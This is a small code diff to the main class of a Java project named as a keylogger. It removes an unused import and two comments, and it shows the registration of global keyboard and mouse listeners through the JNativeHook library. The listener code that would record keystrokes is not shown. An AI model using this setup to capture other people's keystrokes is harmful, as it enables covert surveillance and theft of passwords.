@@ -1,7 +1,5 @@
 package org.keylogger.app;
 
-import java.security.Key;
-
 import org.keylogger.utils.KeyManager;
 import org.keylogger.utils.MouseManager;
 import com.github.kwhat.jnativehook.GlobalScreen;
@@ -19,11 +17,9 @@ public class App {
 			System.exit(1);
 		}
 
-		// Construct the example object.
 		MouseManager mm = new MouseManager();
         KeyManager km = new KeyManager();
 
-		// Add the appropriate listeners.
 		GlobalScreen.addNativeMouseListener(mm);
         GlobalScreen.addNativeKeyListener(km);
     }
